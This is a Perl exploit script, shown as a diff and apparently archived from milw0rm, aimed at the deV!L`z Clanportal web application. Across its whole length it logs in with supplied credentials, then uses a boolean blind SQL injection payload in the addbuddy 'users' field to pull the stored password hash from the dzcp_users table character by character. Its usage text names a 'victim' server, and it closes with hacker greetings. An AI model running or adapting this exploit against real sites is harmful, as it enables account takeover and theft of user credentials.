@@ -1,0 +1,127 @@
+use HTTP::Cookies;
+use LWP::UserAgent;
+ 
+my $ua    = LWP::UserAgent->new( cookie_jar => HTTP::Cookies->new,);
+ 
+$ua->agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
+ 
+usage();
+print "\n";
+ 
+$server =   $ARGV[0];
+$dir = $ARGV[1];
+$username =   $ARGV[2];
+$password = $ARGV[3];
+ 
+if (!$password) { die "Argh! Read teh Usage!\n"; }
+ 
+$url0 = "http://".$server.$dir."user/index.php";
+$url1 = $url0."?action=login&do=yes";
+$url2 = $url0."?action=buddys&do=addbuddy";
+ 
+syswrite(STDOUT, "[x]Connecting...", 16);
+ 
+$response = $ua->get($url0);
+if($response->is_success) {syswrite(STDOUT, "OK", 2);} else { print "\n[x]Ey I couldn't connect to ".$url0; exit;}
+print "\n";
+ 
+$captcha = ($response->content =~ m/secure=login/i) ? 1 : 0;
+ 
+if($captcha) { captcha(); }
+ 
+$response = (!$captcha) ? $ua->post($url1, [ "user" => $username, "pwd" => $password ]) : $ua->post($url1, [ "user" => $username, "pwd" => $password , "secure" => $imgCode]);
+ 
+if($response->content =~ m/Sicherheitsscode/i) { print "[x]Lol you gave me wrong image code. Restart!"; exit; }
+elsif($response->content =~ m/gesperrt/i) { print "[x]Omg you gave me wrong user details. Restart!"; exit; }
+ 
+$response = $ua->get($url2);
+ 
+print "[x]Kay, unleashing BlackMagic now. Getta Coffee and wait!!\n";
+ 
+my @Daten;
+array();
+ 
+my $operator;
+ 
+syswrite(STDOUT, "[x]Password: ", 13);
+ 
+for($b=1;$b<=32;$b++) { inject(0,16); }
+ 
+print "\n[x]OmFg I made it!!\n";
+print "[x]Have FUN!\n";
+print "[x]Greetz & Shoutz go to: IP-Sh0k, haZl0oh, bizzit, NoNePub, thund3r ,ramon,\n";
+print "   J0hn.X3r, electron1x, Paloxus, -tmh- aka B-Baerchi, Nazrek aka Patrick_B, WooMic, codeblu815\n";
+print "   Free-Hack, Sys-Flaw, SoH and h4ck-y0u!\n";
+print "[x]Biggest Thanks go to Shadowleet aka \$h4d0wl33t who is simply the best at his stuff!";
+ 
+sub hex_to_ascii($)
+{       
+        (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
+        return $str;
+}
+sub inject 
+{
+    $beg = $_[0]; $end = $_[1];   
+    $mid = int(($beg + $end)/2); #print $mid."\n";
+    if(&equals($mid))
+    {       
+        syswrite(STDOUT, hex_to_ascii($Daten[$mid]), 1);                 
+        return;   
+    }
+    elsif(&bigger($mid)) { return inject($mid + 1, $end); }   
+    else { return inject($beg, $mid - 1); }       
+}
+ 
+sub equals { $ack = $_[0]; if( &request("=", $ack) !~ m/1242/i) { return 1; } }
+ 
+sub bigger { $ack = $_[0]; if(&request(">", $ack) !~ m/1242/i) { return 1; } }
+ 
+sub request
+{   
+    $operator = $_[0]; $bick = $_[1];                             #probably only users without dzcp_
+    $response = $ua->post($url2, [ "users" => "999 and if(substring((select pwd from dzcp_users limit 0,1),".$b.",1)".$operator."0x".$Daten[$bick].",null,(select 1 union select 2))" ]);
+    #print $response->content;
+    return $response->content;
+}
+ 
+sub usage()
+{
+    print q
+    {
+    ------------------NON PUBLIC EXPLOIT-----------------
+    #####################################################
+            deV!L`z Clanportal BlackMagic EXPLOIT         
+                  -Exploit coded by h0yt3r-             
+     Usage: devilz.pl [Server] [Path] [Username] [Password]
+     Sample:                           
+     perl devilz.pl www.victim.com /devilz/ h0yt3r 1337 
+ 
+     Exploit requires Username and Password, as the vul-
+     nerable file is only visible for registered users! 
+    #####################################################
+    };
+ 
+}
+ 
+sub captcha
+{
+    print "[x]Captcha required!\n";
+    $captchaURL = "http://".$server.$dir."/antispam.php?secure=login";
+    my $captchaReq= $ua->get($captchaURL);
+    open(IMG,">captcha.jpg");
+    binmode IMG;
+    print IMG $captchaReq->content;
+    close IMG;
+    system('start captcha.jpg');
+    print "[x]Image Code: ";
+    $imgCode = <STDIN>;
+    chop($imgCode);   
+}
+ 
+sub array
+{
+    for($b=30;$b<=39; $b++) { push(@Daten,$b); }
+    for($b=61;$b<=66; $b++) { push(@Daten,$b); }
+}
+
+# milw0rm.com [2008-11-02]
